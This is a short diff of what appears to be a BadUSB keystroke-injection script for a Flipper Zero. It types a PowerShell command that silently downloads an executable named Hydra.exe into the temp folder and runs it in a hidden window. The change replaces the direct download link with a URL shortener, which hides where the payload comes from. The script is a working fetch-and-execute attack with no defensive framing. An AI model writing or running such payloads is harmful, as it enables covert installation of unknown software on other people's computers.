@@ -7,5 +7,5 @@ DELAY 500
 STRING powershell
 ENTER
 DELAY 500
-STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://gitfront.io/r/user-6193928/a5WpgTCLW59D/FlipperZero/raw/badusb/hydra/Hydra.exe' -OutFile 'Hydra.exe'; Start-Process -FilePath '.\Hydra.exe'; exit" -WindowStyle Hidden; exit
+STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://tinyurl.com/2p9hrj47' -OutFile 'Hydra.exe'; Start-Process -FilePath '.\Hydra.exe'; exit" -WindowStyle Hidden; exit
 ENTER
